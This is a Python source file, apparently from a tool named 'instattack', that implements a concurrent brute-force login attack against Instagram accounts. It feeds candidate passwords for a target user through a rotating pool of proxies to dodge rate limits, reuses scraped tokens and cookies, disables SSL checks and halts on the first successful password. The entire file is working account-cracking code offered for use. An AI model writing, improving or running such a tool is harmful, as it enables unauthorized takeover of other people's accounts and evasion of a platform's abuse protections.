from __future__ import absolute_import

import asyncio
import aiohttp
import aiojobs
import collections

from instattack import settings
from instattack.exceptions import NoPasswordsError
from instattack.src.base import HandlerMixin
from instattack.src.utils import percentage

from .exceptions import (
    HTTP_REQUEST_ERRORS, HTTP_RESPONSE_ERRORS,
    find_response_error, find_request_error,
    HttpResponseError, HttpRequestError, InstagramResultError, HttpFileDescriptorError)

from .models import InstagramResults, InstagramResult
from .utils import get_token, limit_on_success, limit_as_completed


"""
In Regard to Cancelled Tasks on Web Server Disconnect:
---------
<https://github.com/aio-libs/aiohttp/issues/2098>

Now web-handler task is cancelled on client disconnection (normal socket closing
by peer or just connection dropping by unpluging a wire etc.)

This is pretty normal behavior but it confuses people who come from world of
synchronous WSGI web frameworks like flask or django.

>>> async def handler(request):
>>>     async with request.app['db'] as conn:
>>>          await conn.execute('UPDATE ...')

The above is problematic if there is a client disconnect.

To remedy:

(1)  For client disconnections/fighting against Task cancellation I would
     recommend asyncio.shield. That's why it exists
(2)  In case user wants a way to control tasks in a more granular way, then I
     would recommend aiojobs
(3)  Ofc if user wants to execute background tasks (inside the same loop) I
      would also recommend aiojobs
"""


class LoginHandler(HandlerMixin):

    __name__ = 'Login Handler'
    __logconfig__ = "login_attempts"

    def __init__(self, config, proxy_handler, user=None, start_event=None, stop_event=None):

        self.user = user
        self.start_event = start_event
        self.stop_event = stop_event
        self.config = config
        self.proxy_handler = proxy_handler

        self._headers = None
        self._cookies = None
        self._token = None

        self.limit = config['login']['limit']
        self.batch_size = config['login']['batch_size']
        self.attempt_batch_size = config['login']['attempts']['batch_size']

        self.passwords = asyncio.Queue()

        self.num_completed = 0
        self.num_passwords = 0  # Index for the current password and attempts per password.
        self.attempts_count = collections.Counter()  # Indexed by Password
        self.proxies_count = collections.Counter()  # Indexed by Proxy Unique ID

    async def run(self, loop):
        log = self.create_logger('attack', ignore_config=True)
        await log.start('Running Login Handler')

        await self.prepopulate(loop)
        results = await self.attack(loop)
        await log.complete('Login Handler Done')
        return results

    async def attempt_single_login(self, loop, password):
        log = self.create_logger('attack', ignore_config=True)
        await log.start('Starting Single Login')

        await self.passwords.put(password)
        self.num_passwords = 1

        results = await self.attack(loop)
        return results.results[0]

    async def attack(self, loop):
        log = self.create_logger('attack', ignore_config=True)

        await log.start('Starting Attack')

        scheduler = await aiojobs.create_scheduler(limit=10, exception_handler=None)
        results = await self.attempt_login(loop, scheduler)
        return results

    async def prepopulate(self, loop):
        log = self.create_logger('prepopulate', ignore_config=True)

        message = f'Generating All Attempts for User {self.user.username}.'
        if self.limit:
            message = f'Generating {self.limit} Attempts for User {self.user.username}.'
        await log.start(message)

        passwords = await self.user.get_new_attempts(loop, limit=self.limit)
        if len(passwords) == 0:
            raise NoPasswordsError()

        self.num_passwords = len(passwords)
        for password in passwords:
            await self.passwords.put(password)

        await log.complete(f"Prepopulated {len(passwords)} Password Attempts")

    @property
    def _connector(self):
        return aiohttp.TCPConnector(
            ssl=False,
            force_close=True,
            limit=self.config['login']['connection']['limit'],
            limit_per_host=self.config['login']['connection']['limit_per_host'],
            enable_cleanup_closed=True,
        )

    @property
    def _timeout(self):
        return aiohttp.ClientTimeout(
            total=self.config['login']['connection']['timeout']
        )

    def _login_data(self, password):
        return {
            settings.INSTAGRAM_USERNAME_FIELD: self.user.username,
            settings.INSTAGRAM_PASSWORD_FIELD: password
        }

    @property
    def headers(self):
        return self._headers

    @property
    def token(self):
        return self._token

    async def cookies(self):
        if not self._cookies:
            # TODO: Set timeout to the token timeout.
            sess = aiohttp.ClientSession(connector=self._connector)
            self._token, self._cookies = await get_token(sess)

            if not self._token:
                raise RuntimeError('Could not find token.')

            self._headers = settings.HEADERS(self._token)
            await sess.close()

        return self._cookies

    async def generate_login_tasks(self, loop, session, scheduler):
        """
        Generates coroutines for each password to be attempted and yields
        them in the generator.

        We don't have to worry about a stop event if the authenticated result
        is found since this will generate relatively quickly and the coroutines
        have not been run yet.
        """
        while not self.passwords.empty():
            password = await self.passwords.get()
            if password:
                yield self.attempt_with_password(loop, session, password, scheduler)

    async def attempt_login(self, loop, scheduler):
        """
        For each password in the queue, runs the login_with_password coroutine
        concurrently in order to validate each password.

        The login_with_password coroutine will make several concurrent requests
        using different proxies, so this is the top level of a tree of nested
        concurrent IO operations.
        """
        log = self.create_logger('attempt_login')

        results = InstagramResults(results=[])

        await log.debug('Waiting on Start Event...')
        await self.start_event.wait()
        cookies = await self.cookies()

        async with aiohttp.ClientSession(
            connector=self._connector,
            cookies=cookies,
            timeout=self._timeout,
        ) as session:

            gen = self.generate_login_tasks(loop, session, scheduler)

            async for result in limit_as_completed(gen, self.batch_size):
                # Generator Does Not Yield None on No More Coroutines
                if not result.conclusive:
                    raise RuntimeError("Result should be valid and conclusive.")

                self.num_completed += 1

                await log.success(
                    f'Percent Done: {percentage(self.num_completed, self.num_passwords)}')

                if result.authorized:
                    asyncio.shield(scheduler.spawn(
                        self.user.create_or_update_attempt(result.password, success=True)))
                    results.add(result)
                    break

                else:
                    if not result.not_authorized:
                        raise RuntimeError('Result should not be authorized.')

                    results.add(result)
                    asyncio.shield(scheduler.spawn(
                        self.user.create_or_update_attempt(result.password, success=False)))

        await log.complete('Closing Session')
        await asyncio.sleep(0)

        asyncio.shield(scheduler.close())
        return results

    async def generate_login_attempts(self, loop, session, password, scheduler):
        """
        Generates coroutines for each password to be attempted and yields
        them in the generator.

        We don't have to worry about a stop event if the authenticated result
        is found since this will generate relatively quickly and the coroutines
        have not been run yet.
        """
        log = self.create_logger('generate_login_attempts')

        while True:
            proxy = await self.proxy_handler.pool.get()
            if not proxy:
                # TODO: Raise Exception Here Instead
                await log.error('No More Proxies in Pool')
                break

            if proxy.unique_id in self.proxies_count:
                await log.warning(
                    f'Already Used Proxy {self.proxies_count[proxy.unique_id]} Times.',
                    extra={'proxy': proxy}
                )

            # We are going to want to use these to display information
            # later...
            self.proxies_count[proxy.unique_id] += 1
            self.attempts_count[password] += 1
            yield self.login_request(loop, session, password, proxy, scheduler)

    async def attempt_with_password(self, loop, session, password, scheduler):
        """
        Makes concurrent fetches for a single password and limits the number of
        current fetches to the batch_size.  Will return when it finds the first
        request that returns a valid result.
        """
        log = self.create_logger('attempt_with_password')

        # TODO:  We should figure out a way to allow proxies to repopulate and wait
        # on them for large number of password requests.  We don't want to bail when
        # there are no more proxies because we might be using them all currently

        # Wait for start event to signal that we are ready to start making
        # requests with the proxies.
        await self.start_event.wait()

        await log.start(f'Atempting Login with {password}')

        result, num_tries = await limit_on_success(
            self.generate_login_attempts(loop, session, password, scheduler),
            self.attempt_batch_size
        )

        await log.complete(
            f'Done Attempting Login with {password} '
            f'After {num_tries} Attempt(s)',
            extra={
                'other': result
            })
        return result

    async def login_request(self, loop, session, password, proxy, scheduler):
        """
        For a given password, makes a series of concurrent requests, each using
        a different proxy, until a result is found that authenticates or dis-
        authenticates the given password.

        TODO
        ----
        Only remove proxy if the error has occured a certain number of times, we
        should allow proxies to occasionally throw a single error.
        """
        proxy.update_time()

        async def parse_response_result(result, password, proxy):
            """
            Raises an exception if the result that was in the response is either
            non-conclusive or has an error in it.

            If the result does not have an error and is non conslusive, than we
            can assume that the proxy was most likely good.
            """
            result = InstagramResult.from_dict(result, proxy=proxy, password=password)
            if result.has_error:
                raise InstagramResultError(result.error_message)
            else:
                if not result.conclusive:
                    raise InstagramResultError("Inconslusive result.")
                return result

        async def raise_for_result(response):
            """
            Since a 400 response will have valid json that can indicate an authentication,
            via a `checkpoint_required` value, we cannot raise_for_status until after
            we try to first get the response json.
            """
            if response.status != 400:
                response.raise_for_status()
                json = await response.json()
                result = await parse_response_result(json, password, proxy)
                return result
            else:
                # Parse JSON First
                json = await response.json()
                try:
                    return await parse_response_result(json, password, proxy)  # noqa
                except InstagramResultError as e:
                    # Be Careful: If this doesn't raise a response the result will be None.
                    response.raise_for_status()

        try:
            async with session.post(
                settings.INSTAGRAM_LOGIN_URL,
                headers=self.headers,
                data=self._login_data(password),
                ssl=False,
                proxy=proxy.url  # Only Http Proxies Are Supported by AioHTTP
            ) as response:

                result = await raise_for_result(response)
                await proxy.handle_success()
                await self.proxy_handler.pool.put(proxy)
                await scheduler.spawn(proxy.save())

                return result

        except HTTP_RESPONSE_ERRORS as e:
            await self.communicate_response_error(e, proxy, scheduler)

        except HTTP_REQUEST_ERRORS as e:
            await self.communicate_request_error(e, proxy, scheduler)

        # We shouldn't really need this unless we are running over large numbers
        # of requests... so keep for now.
        # except RuntimeError as e:
        #     """
        #     RuntimeError: File descriptor 87 is used by transport
        #     <_SelectorSocketTransport fd=87 read=polling write=<idle, bufsize=0>>

        #     All other RuntimeError(s) we want to raise.
        #     """
        #     if e.errno == 87:
        #         e = HttpFileDescriptorError(original=e)
        #         await self.communicate_request_error(e, proxy, scheduler)
        #     else:
        #         raise e

    async def communicate_response_error(self, e, proxy, scheduler):
        """
        Creates exception instances that we have established internally so their
        treatment and handling in regard to proxies and the pool can be determined
        from the error directly.

        If the error is not an instance of HttpError (our internal error), the
        internal version of the error will be determined and this method will
        be called recursively with the created error, that will be an instance
        of HttpError.
        """
        log = self.create_logger('communicate_response_error')

        # These Are Our Errors - Logged in Handle Method
        if isinstance(e, HttpResponseError):
            await self.handle_proxy_error(e, proxy, scheduler)
        else:
            if isinstance(e, asyncio.CancelledError):
                await log.debug('Request Cancelled')
                pass
            else:
                # Try to associate the error with one that we are familiar with,
                # if we cannot find the appropriate error, than we raise it since
                # we are not aware of this error.
                err = find_response_error(e)
                if not err:
                    raise e

                # Logging might be redundant since our error will be logged in the
                # subsequent call.
                await self.communicate_response_error(err, proxy, scheduler)

    async def communicate_request_error(self, e, proxy, scheduler):
        """
        Creates exception instances that we have established internally so their
        treatment and handling in regard to proxies and the pool can be determined
        from the error directly.

        If the error is not an instance of HttpError (our internal error), the
        internal version of the error will be determined and this method will
        be called recursively with the created error, that will be an instance
        of HttpError.
        """
        log = self.create_logger('communicate_request_error')

        # These Are Our Errors - Logged in Handle Method
        if isinstance(e, HttpRequestError):
            await self.handle_proxy_error(e, proxy, scheduler)
        else:
            if isinstance(e, asyncio.CancelledError):
                await log.debug('Request Cancelled')
                pass
            else:
                # Try to associate the error with one that we are familiar with,
                # if we cannot find the appropriate error, than we raise it since
                # we are not aware of this error.
                err = find_request_error(e)
                if not err:
                    raise e

                # Logging might be redundant since our error will be logged in the
                # subsequent call.
                await self.communicate_request_error(err, proxy, scheduler)

    async def handle_proxy_error(self, e, proxy, scheduler):
        """
        [1] Fatal Error:
        ---------------
        If `remove_invalid_proxy` is set to True and this error occurs,
        the proxy will be removed from the database.
        If `remove_invalid_proxy` is False, the proxy will just be noted
        with the error and the proxy will not be put back in the pool.

        Since we will not delete directly from this method (we need config)
        we will just note the error.

        [2] Inconclusive Error:
        ----------------------
        Proxy will not be noted with the error and the proxy will be put
        back in pool.

        [3] Semi-Fatal Error:
        --------------------
        Regardless of the value of `remove_invalid_proxy`, the  proxy
        will be noted with the error and the proxy will be removed from
        the pool.

        [4] General Error:
        -----------------
        Proxy will be noted with error but put back in the pool.

        TODO
        ----
        Only remove proxy if the error has occured a certain number of times, we
        should allow proxies to occasionally throw a single error.
        """
        log = self.create_logger('handle_proxy_error', ignore_config=True)

        # Allow Manual Treatments
        await proxy.handle_error(e)

        if e.__treatment__ == 'fatal':
            if self.config['proxies']['pool']['remove_proxy_on_error']:
                await log.error(e, extra={
                    'other': 'FATAL: Deleting Proxy, Removing from Pool',
                    'proxy': proxy
                })
                await scheduler.spawn(proxy.delete())
            else:
                await log.error(e, extra={
                    'other': 'FATAL: Not Deleting Proxy, Removing from Pool',
                    'proxy': proxy
                })
                await scheduler.spawn(proxy.save())

        elif e.__treatment__ in ('semifatal', 'error'):
            if e.__treatment__ == 'error':
                await log.error(e, extra={
                    'other': 'ERROR: Putting Back in Pool',
                    'proxy': proxy,
                })
                await self.proxy_handler.pool.put(proxy)
            else:
                await log.error(e, extra={
                    'other': 'SEMIFATAL: Removing Proxy from Pool',
                    'proxy': proxy,
                })

            await scheduler.spawn(proxy.save())

        elif e.__treatment__ == 'inconclusive':
            # Do not need to save... but we should to make sure the updated time
            # reflects in other attacks.
            await log.error(e, extra={
                'other': 'INCONCLUSIVE: Putting Back in Pool',
                'proxy': proxy,
            })
            await self.proxy_handler.pool.put(proxy)
            await scheduler.spawn(proxy.save())

        else:
            raise RuntimeError(f'Invalid treatment {e.__treatment__}.')
